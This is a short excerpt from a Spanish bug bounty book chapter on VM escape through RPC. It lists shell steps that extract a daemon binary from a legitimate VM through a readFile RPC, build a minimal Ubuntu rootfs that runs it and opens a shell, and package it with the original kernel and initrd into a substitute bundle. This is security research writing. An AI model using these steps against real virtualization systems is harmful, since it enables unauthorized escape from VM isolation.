# Extraído de: LibroBugBounty/cap-13-vm-escape-rpc.md
# 1. Extraer sdk-daemon de la VM legítima (via readFile RPC)
# sdk-daemon es un ELF 64-bit statically linked, 8.274.104 bytes

# 2. Crear un rootfs mínimo con Ubuntu 22.04
debootstrap --arch=amd64 jammy ./rootfs
cp sdk-daemon ./rootfs/usr/local/bin/
chmod +x ./rootfs/usr/local/bin/sdk-daemon

# 3. Configurar init para ejecutar sdk-daemon
cat > ./rootfs/etc/init.d/sdk <<'EOF'
#!/bin/sh
/usr/local/bin/sdk-daemon &
exec /bin/sh
EOF
chmod +x ./rootfs/etc/init.d/sdk

# 4. Crear imagen ext4
dd if=/dev/zero of=rootfs.ext4 bs=1M count=256
mkfs.ext4 rootfs.ext4
mount rootfs.ext4 /mnt && cp -a ./rootfs/* /mnt/ && umount /mnt

# 5. Copiar kernel e initrd del bundle legítimo (son genéricos)
cp /original/bundle/vmlinux ./bundle/
cp /original/bundle/initrd ./bundle/
cp rootfs.ext4 ./bundle/
cp /original/bundle/config.json ./bundle/
